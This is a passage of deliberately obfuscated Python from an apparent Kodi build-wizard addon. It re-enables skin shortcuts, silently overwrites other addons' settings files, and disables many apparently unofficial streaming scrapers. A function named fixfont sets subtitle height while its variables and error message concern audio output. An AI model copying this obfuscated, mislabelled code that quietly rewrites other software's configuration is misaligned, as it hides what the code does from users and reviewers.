		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1197
    with open (OOOO0O00O00O0O000 ,'w')as O00O000000OO0OO00 :#line:1200
      O00O000000OO0OO00 .write (O000000000000O0O0 )#line:1201
    OOOO0O00O00O0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1205
    with open (OOOO0O00O00O0O000 ,'r')as O00O000000OO0OO00 :#line:1206
      O000000000000O0O0 =O00O000000OO0OO00 .read ()#line:1207
    O000000000000O0O0 =O000000000000O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1225
    with open (OOOO0O00O00O0O000 ,'w')as O00O000000OO0OO00 :#line:1228
      O00O000000OO0OO00 .write (O000000000000O0O0 )#line:1229
    OOOO0O00O00O0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1233
    with open (OOOO0O00O00O0O000 ,'r')as O00O000000OO0OO00 :#line:1234
      O000000000000O0O0 =O00O000000OO0OO00 .read ()#line:1235
    O000000000000O0O0 =O000000000000O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1253
    with open (OOOO0O00O00O0O000 ,'w')as O00O000000OO0OO00 :#line:1256
      O00O000000OO0OO00 .write (O000000000000O0O0 )#line:1257
    OOOO0O00O00O0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1261
    with open (OOOO0O00O00O0O000 ,'r')as O00O000000OO0OO00 :#line:1262
      O000000000000O0O0 =O00O000000OO0OO00 .read ()#line:1263
    O000000000000O0O0 =O000000000000O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1281
    with open (OOOO0O00O00O0O000 ,'w')as O00O000000OO0OO00 :#line:1284
      O00O000000OO0OO00 .write (O000000000000O0O0 )#line:1285
    OOOO0O00O00O0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1288
    with open (OOOO0O00O00O0O000 ,'r')as O00O000000OO0OO00 :#line:1289
      O000000000000O0O0 =O00O000000OO0OO00 .read ()#line:1290
    O000000000000O0O0 =O000000000000O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1308
    with open (OOOO0O00O00O0O000 ,'w')as O00O000000OO0OO00 :#line:1311
      O00O000000OO0OO00 .write (O000000000000O0O0 )#line:1312
    OOOO0O00O00O0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1314
    with open (OOOO0O00O00O0O000 ,'r')as O00O000000OO0OO00 :#line:1315
      O000000000000O0O0 =O00O000000OO0OO00 .read ()#line:1316
    O000000000000O0O0 =O000000000000O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1334
    with open (OOOO0O00O00O0O000 ,'w')as O00O000000OO0OO00 :#line:1337
      O00O000000OO0OO00 .write (O000000000000O0O0 )#line:1338
    OOOO0O00O00O0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1340
    with open (OOOO0O00O00O0O000 ,'r')as O00O000000OO0OO00 :#line:1341
      O000000000000O0O0 =O00O000000OO0OO00 .read ()#line:1342
    O000000000000O0O0 =O000000000000O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1360
    with open (OOOO0O00O00O0O000 ,'w')as O00O000000OO0OO00 :#line:1363
      O00O000000OO0OO00 .write (O000000000000O0O0 )#line:1364
    OOOO0O00O00O0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1367
    with open (OOOO0O00O00O0O000 ,'r')as O00O000000OO0OO00 :#line:1368
      O000000000000O0O0 =O00O000000OO0OO00 .read ()#line:1369
    O000000000000O0O0 =O000000000000O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1387
    with open (OOOO0O00O00O0O000 ,'w')as O00O000000OO0OO00 :#line:1390
      O00O000000OO0OO00 .write (O000000000000O0O0 )#line:1391
def rdbuildinstallON ():#line:1394
    try :#line:1396
       O0OO0O0OOOO00O0OO =ADDONPATH +"/resources/rd/victory.xml"#line:1397
       O00OO0OOOOOO000OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1398
       copyfile (O0OO0O0OOOO00O0OO ,O00OO0OOOOOO000OO )#line:1400
       O0OO0O0OOOO00O0OO =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1402
       O00OO0OOOOOO000OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1403
       copyfile (O0OO0O0OOOO00O0OO ,O00OO0OOOOOO000OO )#line:1405
       O0OO0O0OOOO00O0OO =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1407
       O00OO0OOOOOO000OO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1408
       copyfile (O0OO0O0OOOO00O0OO ,O00OO0OOOOOO000OO )#line:1410
       O0OO0O0OOOO00O0OO =ADDONPATH +"/resources/rd/Splash.png"#line:1413
       O00OO0OOOOOO000OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1414
       copyfile (O0OO0O0OOOO00O0OO ,O00OO0OOOOOO000OO )#line:1416
    except :#line:1418
       pass #line:1419
def rdbuild ():#line:1429
	OO0O000O00OOO00OO =(ADDON .getSetting ("auto_rd"))#line:1430
	if OO0O000O00OOO00OO =='true':#line:1431
		O0O0OO00O0OO00OO0 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1432
		O0O0OO00O0OO00OO0 .setSetting ('all_t','0')#line:1433
		O0O0OO00O0OO00OO0 .setSetting ('rd_menu_enable','false')#line:1434
		O0O0OO00O0OO00OO0 .setSetting ('magnet_bay','false')#line:1435
		O0O0OO00O0OO00OO0 .setSetting ('magnet_extra','false')#line:1436
		O0O0OO00O0OO00OO0 .setSetting ('rd_only','false')#line:1437
		O0O0OO00O0OO00OO0 .setSetting ('ftp','false')#line:1439
		O0O0OO00O0OO00OO0 .setSetting ('fp','false')#line:1440
		O0O0OO00O0OO00OO0 .setSetting ('filter_fp','false')#line:1441
		O0O0OO00O0OO00OO0 .setSetting ('fp_size_en','false')#line:1442
		O0O0OO00O0OO00OO0 .setSetting ('afdah','false')#line:1443
		O0O0OO00O0OO00OO0 .setSetting ('ap2s','false')#line:1444
		O0O0OO00O0OO00OO0 .setSetting ('cin','false')#line:1445
		O0O0OO00O0OO00OO0 .setSetting ('clv','false')#line:1446
		O0O0OO00O0OO00OO0 .setSetting ('cmv','false')#line:1447
		O0O0OO00O0OO00OO0 .setSetting ('dl20','false')#line:1448
		O0O0OO00O0OO00OO0 .setSetting ('esc','false')#line:1449
		O0O0OO00O0OO00OO0 .setSetting ('extra','false')#line:1450
		O0O0OO00O0OO00OO0 .setSetting ('film','false')#line:1451
		O0O0OO00O0OO00OO0 .setSetting ('fre','false')#line:1452
		O0O0OO00O0OO00OO0 .setSetting ('fxy','false')#line:1453
		O0O0OO00O0OO00OO0 .setSetting ('genv','false')#line:1454
		O0O0OO00O0OO00OO0 .setSetting ('getgo','false')#line:1455
		O0O0OO00O0OO00OO0 .setSetting ('gold','false')#line:1456
		O0O0OO00O0OO00OO0 .setSetting ('gona','false')#line:1457
		O0O0OO00O0OO00OO0 .setSetting ('hdmm','false')#line:1458
		O0O0OO00O0OO00OO0 .setSetting ('hdt','false')#line:1459
		O0O0OO00O0OO00OO0 .setSetting ('icy','false')#line:1460
		O0O0OO00O0OO00OO0 .setSetting ('ind','false')#line:1461
		O0O0OO00O0OO00OO0 .setSetting ('iwi','false')#line:1462
		O0O0OO00O0OO00OO0 .setSetting ('jen_free','false')#line:1463
		O0O0OO00O0OO00OO0 .setSetting ('kiss','false')#line:1464
		O0O0OO00O0OO00OO0 .setSetting ('lavin','false')#line:1465
		O0O0OO00O0OO00OO0 .setSetting ('los','false')#line:1466
		O0O0OO00O0OO00OO0 .setSetting ('m4u','false')#line:1467
		O0O0OO00O0OO00OO0 .setSetting ('mesh','false')#line:1468
		O0O0OO00O0OO00OO0 .setSetting ('mf','false')#line:1469
		O0O0OO00O0OO00OO0 .setSetting ('mkvc','false')#line:1470
		O0O0OO00O0OO00OO0 .setSetting ('mjy','false')#line:1471
		O0O0OO00O0OO00OO0 .setSetting ('hdonline','false')#line:1472
		O0O0OO00O0OO00OO0 .setSetting ('moviex','false')#line:1473
		O0O0OO00O0OO00OO0 .setSetting ('mpr','false')#line:1474
		O0O0OO00O0OO00OO0 .setSetting ('mvg','false')#line:1475
		O0O0OO00O0OO00OO0 .setSetting ('mvl','false')#line:1476
		O0O0OO00O0OO00OO0 .setSetting ('mvs','false')#line:1477
		O0O0OO00O0OO00OO0 .setSetting ('myeg','false')#line:1478
		O0O0OO00O0OO00OO0 .setSetting ('ninja','false')#line:1479
		O0O0OO00O0OO00OO0 .setSetting ('odb','false')#line:1480
		O0O0OO00O0OO00OO0 .setSetting ('ophd','false')#line:1481
		O0O0OO00O0OO00OO0 .setSetting ('pks','false')#line:1482
		O0O0OO00O0OO00OO0 .setSetting ('prf','false')#line:1483
		O0O0OO00O0OO00OO0 .setSetting ('put18','false')#line:1484
		O0O0OO00O0OO00OO0 .setSetting ('req','false')#line:1485
		O0O0OO00O0OO00OO0 .setSetting ('rftv','false')#line:1486
		O0O0OO00O0OO00OO0 .setSetting ('rltv','false')#line:1487
		O0O0OO00O0OO00OO0 .setSetting ('sc','false')#line:1488
		O0O0OO00O0OO00OO0 .setSetting ('seehd','false')#line:1489
		O0O0OO00O0OO00OO0 .setSetting ('showbox','false')#line:1490
		O0O0OO00O0OO00OO0 .setSetting ('shuid','false')#line:1491
		O0O0OO00O0OO00OO0 .setSetting ('sil_gh','false')#line:1492
		O0O0OO00O0OO00OO0 .setSetting ('spv','false')#line:1493
		O0O0OO00O0OO00OO0 .setSetting ('subs','false')#line:1494
		O0O0OO00O0OO00OO0 .setSetting ('tvs','false')#line:1495
		O0O0OO00O0OO00OO0 .setSetting ('tw','false')#line:1496
		O0O0OO00O0OO00OO0 .setSetting ('upto','false')#line:1497
		O0O0OO00O0OO00OO0 .setSetting ('vel','false')#line:1498
		O0O0OO00O0OO00OO0 .setSetting ('vex','false')#line:1499
		O0O0OO00O0OO00OO0 .setSetting ('vidc','false')#line:1500
		O0O0OO00O0OO00OO0 .setSetting ('w4hd','false')#line:1501
		O0O0OO00O0OO00OO0 .setSetting ('wav','false')#line:1502
		O0O0OO00O0OO00OO0 .setSetting ('wf','false')#line:1503
		O0O0OO00O0OO00OO0 .setSetting ('wse','false')#line:1504
		O0O0OO00O0OO00OO0 .setSetting ('wss','false')#line:1505
		O0O0OO00O0OO00OO0 .setSetting ('wsse','false')#line:1506
		O0O0OO00O0OO00OO0 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1507
		O0O0OO00O0OO00OO0 .setSetting ('debrid.only','true')#line:1508
		O0O0OO00O0OO00OO0 .setSetting ('hosts.captcha','false')#line:1509
		O0O0OO00O0OO00OO0 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1510
		O0O0OO00O0OO00OO0 .setSetting ('provider.123moviehd','false')#line:1511
		O0O0OO00O0OO00OO0 .setSetting ('provider.300mbdownload','false')#line:1512
		O0O0OO00O0OO00OO0 .setSetting ('provider.alltube','false')#line:1513
		O0O0OO00O0OO00OO0 .setSetting ('provider.allucde','false')#line:1514
		O0O0OO00O0OO00OO0 .setSetting ('provider.animebase','false')#line:1515
		O0O0OO00O0OO00OO0 .setSetting ('provider.animeloads','false')#line:1516
		O0O0OO00O0OO00OO0 .setSetting ('provider.animetoon','false')#line:1517
		O0O0OO00O0OO00OO0 .setSetting ('provider.bnwmovies','false')#line:1518
		O0O0OO00O0OO00OO0 .setSetting ('provider.boxfilm','false')#line:1519
		O0O0OO00O0OO00OO0 .setSetting ('provider.bs','false')#line:1520
		O0O0OO00O0OO00OO0 .setSetting ('provider.cartoonhd','false')#line:1521
		O0O0OO00O0OO00OO0 .setSetting ('provider.cdahd','false')#line:1522
		O0O0OO00O0OO00OO0 .setSetting ('provider.cdax','false')#line:1523
		O0O0OO00O0OO00OO0 .setSetting ('provider.cine','false')#line:1524
		O0O0OO00O0OO00OO0 .setSetting ('provider.cinenator','false')#line:1525
		O0O0OO00O0OO00OO0 .setSetting ('provider.cmovieshdbz','false')#line:1526
		O0O0OO00O0OO00OO0 .setSetting ('provider.coolmoviezone','false')#line:1527
		O0O0OO00O0OO00OO0 .setSetting ('provider.ddl','false')#line:1528
		O0O0OO00O0OO00OO0 .setSetting ('provider.deepmovie','false')#line:1529
		O0O0OO00O0OO00OO0 .setSetting ('provider.ekinomaniak','false')#line:1530
		O0O0OO00O0OO00OO0 .setSetting ('provider.ekinotv','false')#line:1531
		O0O0OO00O0OO00OO0 .setSetting ('provider.filiser','false')#line:1532
		O0O0OO00O0OO00OO0 .setSetting ('provider.filmpalast','false')#line:1533
		O0O0OO00O0OO00OO0 .setSetting ('provider.filmwebbooster','false')#line:1534
		O0O0OO00O0OO00OO0 .setSetting ('provider.filmxy','false')#line:1535
		O0O0OO00O0OO00OO0 .setSetting ('provider.fmovies','false')#line:1536
		O0O0OO00O0OO00OO0 .setSetting ('provider.foxx','false')#line:1537
		O0O0OO00O0OO00OO0 .setSetting ('provider.freefmovies','false')#line:1538
		O0O0OO00O0OO00OO0 .setSetting ('provider.freeputlocker','false')#line:1539
		O0O0OO00O0OO00OO0 .setSetting ('provider.furk','false')#line:1540
		O0O0OO00O0OO00OO0 .setSetting ('provider.gamatotv','false')#line:1541
		O0O0OO00O0OO00OO0 .setSetting ('provider.gogoanime','false')#line:1542
		O0O0OO00O0OO00OO0 .setSetting ('provider.gowatchseries','false')#line:1543
		O0O0OO00O0OO00OO0 .setSetting ('provider.hackimdb','false')#line:1544
		O0O0OO00O0OO00OO0 .setSetting ('provider.hdfilme','false')#line:1545
		O0O0OO00O0OO00OO0 .setSetting ('provider.hdmto','false')#line:1546
		O0O0OO00O0OO00OO0 .setSetting ('provider.hdpopcorns','false')#line:1547
		O0O0OO00O0OO00OO0 .setSetting ('provider.hdstreams','false')#line:1548
		O0O0OO00O0OO00OO0 .setSetting ('provider.horrorkino','false')#line:1550
		O0O0OO00O0OO00OO0 .setSetting ('provider.iitv','false')#line:1551
		O0O0OO00O0OO00OO0 .setSetting ('provider.iload','false')#line:1552
		O0O0OO00O0OO00OO0 .setSetting ('provider.iwaatch','false')#line:1553
		O0O0OO00O0OO00OO0 .setSetting ('provider.kinodogs','false')#line:1554
		O0O0OO00O0OO00OO0 .setSetting ('provider.kinoking','false')#line:1555
		O0O0OO00O0OO00OO0 .setSetting ('provider.kinow','false')#line:1556
		O0O0OO00O0OO00OO0 .setSetting ('provider.kinox','false')#line:1557
		O0O0OO00O0OO00OO0 .setSetting ('provider.lichtspielhaus','false')#line:1558
		O0O0OO00O0OO00OO0 .setSetting ('provider.liomenoi','false')#line:1559
		O0O0OO00O0OO00OO0 .setSetting ('provider.magnetdl','false')#line:1562
		O0O0OO00O0OO00OO0 .setSetting ('provider.megapelistv','false')#line:1563
		O0O0OO00O0OO00OO0 .setSetting ('provider.movie2k-ac','false')#line:1564
		O0O0OO00O0OO00OO0 .setSetting ('provider.movie2k-ag','false')#line:1565
		O0O0OO00O0OO00OO0 .setSetting ('provider.movie2z','false')#line:1566
		O0O0OO00O0OO00OO0 .setSetting ('provider.movie4k','false')#line:1567
		O0O0OO00O0OO00OO0 .setSetting ('provider.movie4kis','false')#line:1568
		O0O0OO00O0OO00OO0 .setSetting ('provider.movieneo','false')#line:1569
		O0O0OO00O0OO00OO0 .setSetting ('provider.moviesever','false')#line:1570
		O0O0OO00O0OO00OO0 .setSetting ('provider.movietown','false')#line:1571
		O0O0OO00O0OO00OO0 .setSetting ('provider.mvrls','false')#line:1573
		O0O0OO00O0OO00OO0 .setSetting ('provider.netzkino','false')#line:1574
		O0O0OO00O0OO00OO0 .setSetting ('provider.odb','false')#line:1575
		O0O0OO00O0OO00OO0 .setSetting ('provider.openkatalog','false')#line:1576
		O0O0OO00O0OO00OO0 .setSetting ('provider.ororo','false')#line:1577
		O0O0OO00O0OO00OO0 .setSetting ('provider.paczamy','false')#line:1578
		O0O0OO00O0OO00OO0 .setSetting ('provider.peliculasdk','false')#line:1579
		O0O0OO00O0OO00OO0 .setSetting ('provider.pelisplustv','false')#line:1580
		O0O0OO00O0OO00OO0 .setSetting ('provider.pepecine','false')#line:1581
		O0O0OO00O0OO00OO0 .setSetting ('provider.primewire','false')#line:1582
		O0O0OO00O0OO00OO0 .setSetting ('provider.projectfreetv','false')#line:1583
		O0O0OO00O0OO00OO0 .setSetting ('provider.proxer','false')#line:1584
		O0O0OO00O0OO00OO0 .setSetting ('provider.pureanime','false')#line:1585
		O0O0OO00O0OO00OO0 .setSetting ('provider.putlocker','false')#line:1586
		O0O0OO00O0OO00OO0 .setSetting ('provider.putlockerfree','false')#line:1587
		O0O0OO00O0OO00OO0 .setSetting ('provider.reddit','false')#line:1588
		O0O0OO00O0OO00OO0 .setSetting ('provider.cartoonwire','false')#line:1589
		O0O0OO00O0OO00OO0 .setSetting ('provider.seehd','false')#line:1590
		O0O0OO00O0OO00OO0 .setSetting ('provider.segos','false')#line:1591
		O0O0OO00O0OO00OO0 .setSetting ('provider.serienstream','false')#line:1592
		O0O0OO00O0OO00OO0 .setSetting ('provider.series9','false')#line:1593
		O0O0OO00O0OO00OO0 .setSetting ('provider.seriesever','false')#line:1594
		O0O0OO00O0OO00OO0 .setSetting ('provider.seriesonline','false')#line:1595
		O0O0OO00O0OO00OO0 .setSetting ('provider.seriespapaya','false')#line:1596
		O0O0OO00O0OO00OO0 .setSetting ('provider.sezonlukdizi','false')#line:1597
		O0O0OO00O0OO00OO0 .setSetting ('provider.solarmovie','false')#line:1598
		O0O0OO00O0OO00OO0 .setSetting ('provider.solarmoviez','false')#line:1599
		O0O0OO00O0OO00OO0 .setSetting ('provider.stream-to','false')#line:1600
		O0O0OO00O0OO00OO0 .setSetting ('provider.streamdream','false')#line:1601
		O0O0OO00O0OO00OO0 .setSetting ('provider.streamflix','false')#line:1602
		O0O0OO00O0OO00OO0 .setSetting ('provider.streamit','false')#line:1603
		O0O0OO00O0OO00OO0 .setSetting ('provider.swatchseries','false')#line:1604
		O0O0OO00O0OO00OO0 .setSetting ('provider.szukajkatv','false')#line:1605
		O0O0OO00O0OO00OO0 .setSetting ('provider.tainiesonline','false')#line:1606
		O0O0OO00O0OO00OO0 .setSetting ('provider.tainiomania','false')#line:1607
		O0O0OO00O0OO00OO0 .setSetting ('provider.tata','false')#line:1610
		O0O0OO00O0OO00OO0 .setSetting ('provider.trt','false')#line:1611
		O0O0OO00O0OO00OO0 .setSetting ('provider.tvbox','false')#line:1612
		O0O0OO00O0OO00OO0 .setSetting ('provider.ultrahd','false')#line:1613
		O0O0OO00O0OO00OO0 .setSetting ('provider.video4k','false')#line:1614
		O0O0OO00O0OO00OO0 .setSetting ('provider.vidics','false')#line:1615
		O0O0OO00O0OO00OO0 .setSetting ('provider.view4u','false')#line:1616
		O0O0OO00O0OO00OO0 .setSetting ('provider.watchseries','false')#line:1617
		O0O0OO00O0OO00OO0 .setSetting ('provider.xrysoi','false')#line:1618
		O0O0OO00O0OO00OO0 .setSetting ('provider.library','false')#line:1619
def fixfont ():#line:1622
	O0O000OO00OOOOO0O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1623
	O0OOOO0000O00OO00 =json .loads (O0O000OO00OOOOO0O );#line:1625
	O00O0OOOO00O00000 =O0OOOO0000O00OO00 ["result"]["settings"]#line:1626
	O0OOOOO0OO000000O =[OOOOOOOO000OO000O for OOOOOOOO000OO000O in O00O0OOOO00O00000 if OOOOOOOO000OO000O ["id"]=="audiooutput.audiodevice"][0 ]#line:1628
	OO0O00O00OOO00OOO =O0OOOOO0OO000000O ["options"];#line:1629
	O00OOO00O00O0000O =O0OOOOO0OO000000O ["value"];#line:1630
	O0OOO0O0OOO0OOO0O =[O0O0OO0O0000OO00O for (O0O0OO0O0000OO00O ,OOO0O0OO00OO00O00 )in enumerate (OO0O00O00OOO00OOO )if OOO0O0OO00OO00O00 ["value"]==O00OOO00O00O0000O ][0 ];#line:1632
	O0OO0OO00O0OOO0O0 =(O0OOO0O0OOO0OOO0O +1 )%len (OO0O00O00OOO00OOO )#line:1634
	OO0O00O000OO000OO =OO0O00O00OOO00OOO [O0OO0OO00O0OOO0O0 ]["value"]#line:1636
	OO0OOOOO0O0000OO0 =OO0O00O00OOO00OOO [O0OO0OO00O0OOO0O0 ]["label"]#line:1637
	O0O00OO0000OO0O00 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1639
	try :#line:1641
		OO0OO0O0OO0O0O0OO =json .loads (O0O00OO0000OO0O00 );#line:1642
		if OO0OO0O0OO0O0O0OO ["result"]!=True :#line:1644
			raise Exception #line:1645
	except :#line:1646
		sys .stderr .write ("Error switching audio output device")#line:1647
		raise Exception #line:1648
def parseDOM2 (O00O000OOO00000OO ,name =u"",attrs ={},ret =False ):#line:1649
	if isinstance (O00O000OOO00000OO ,str ):#line:1652
		try :#line:1653
			O00O000OOO00000OO =[O00O000OOO00000OO .decode ("utf-8")]#line:1654
		except :#line:1655
			O00O000OOO00000OO =[O00O000OOO00000OO ]#line:1656
	elif isinstance (O00O000OOO00000OO ,unicode ):#line:1657
		O00O000OOO00000OO =[O00O000OOO00000OO ]#line:1658
	elif not isinstance (O00O000OOO00000OO ,list ):#line:1659
		return u""#line:1660
	if not name .strip ():#line:1662
		return u""#line:1663
	O00O0O0O00O000O00 =[]#line:1665
	for O000O00O0O0OOO0O0 in O00O000OOO00000OO :#line:1666
		O00OO0O00O00OO00O =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O000O00O0O0OOO0O0 )#line:1667
		for OOO00OOOOOOOO0O00 in O00OO0O00O00OO00O :#line:1668
			O000O00O0O0OOO0O0 =O000O00O0O0OOO0O0 .replace (OOO00OOOOOOOO0O00 ,OOO00OOOOOOOO0O00 .replace ("\n"," "))#line:1669
		OO0O0O00O00O0OOOO =[]#line:1671
		for OO000000OO00O0OOO in attrs :#line:1672
			O00OOO000OO000O00 =re .compile ('(<'+name +'[^>]*?(?:'+OO000000OO00O0OOO +'=[\'"]'+attrs [OO000000OO00O0OOO ]+'[\'"].*?>))',re .M |re .S ).findall (O000O00O0O0OOO0O0 )#line:1673
			if len (O00OOO000OO000O00 )==0 and attrs [OO000000OO00O0OOO ].find (" ")==-1 :#line:1674
				O00OOO000OO000O00 =re .compile ('(<'+name +'[^>]*?(?:'+OO000000OO00O0OOO +'='+attrs [OO000000OO00O0OOO ]+'.*?>))',re .M |re .S ).findall (O000O00O0O0OOO0O0 )#line:1675
			if len (OO0O0O00O00O0OOOO )==0 :#line:1677
				OO0O0O00O00O0OOOO =O00OOO000OO000O00 #line:1678
				O00OOO000OO000O00 =[]#line:1679
			else :#line:1680
				O000000OO0000O000 =range (len (OO0O0O00O00O0OOOO ))#line:1681
				O000000OO0000O000 .reverse ()#line:1682
				for OO00O00O0O000OO00 in O000000OO0000O000 :#line:1683
					if not OO0O0O00O00O0OOOO [OO00O00O0O000OO00 ]in O00OOO000OO000O00 :#line:1684
						del (OO0O0O00O00O0OOOO [OO00O00O0O000OO00 ])#line:1685
		if len (OO0O0O00O00O0OOOO )==0 and attrs =={}:#line:1687
			OO0O0O00O00O0OOOO =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O000O00O0O0OOO0O0 )#line:1688
			if len (OO0O0O00O00O0OOOO )==0 :#line:1689
				OO0O0O00O00O0OOOO =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O000O00O0O0OOO0O0 )#line:1690
		if isinstance (ret ,str ):#line:1692
			O00OOO000OO000O00 =[]#line:1693
			for OOO00OOOOOOOO0O00 in OO0O0O00O00O0OOOO :#line:1694
				OOOOOOOOOO0OOO0OO =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OOO00OOOOOOOO0O00 )#line:1695
				if len (OOOOOOOOOO0OOO0OO )==0 :#line:1696
					OOOOOOOOOO0OOO0OO =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OOO00OOOOOOOO0O00 )#line:1697
				for OOOO000O000OO00OO in OOOOOOOOOO0OOO0OO :#line:1698
					O0O000O000O00O00O =OOOO000O000OO00OO [0 ]#line:1699
					if O0O000O000O00O00O in "'\"":#line:1700
						if OOOO000O000OO00OO .find ('='+O0O000O000O00O00O ,OOOO000O000OO00OO .find (O0O000O000O00O00O ,1 ))>-1 :#line:1701
